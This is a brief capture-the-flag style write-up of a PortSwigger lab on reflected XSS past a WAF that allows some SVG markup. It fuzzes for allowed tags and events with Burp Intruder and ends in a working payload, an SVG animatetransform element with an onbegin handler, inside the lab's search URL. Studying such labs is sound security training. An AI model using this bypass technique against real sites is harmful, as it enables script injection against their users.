```
Reflected XSS with some SVG markup allowed
```

Doing `<script>alert(1)</script>` on search will result in it being blocked via WAF
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/17c9e8f6-7b74-4785-b5cd-03f29edb0722)

Load up on burpesuite intruder 
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Copy event tag
Find out what tag we can use that is not blocked
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3108794e-8647-4a88-baab-7d359108db3d)




We can use `animatetransform` 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fadd898a-d3af-4e87-825a-3727cc68e72a)





Find out what event we can use
`GET /?search=<animatetransform%20§§=1>`

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dcdd8187-02f2-4a48-99e5-263d45592d9e)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a836e5eb-84a3-4a90-ac65-f48d0997bd99)



We can use onbegin

Construct a query to break out so we can xss
`"><svg><animatetransform onbegin=alert(1)>`

```

https://YOUR-LAB-ID.web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>

```
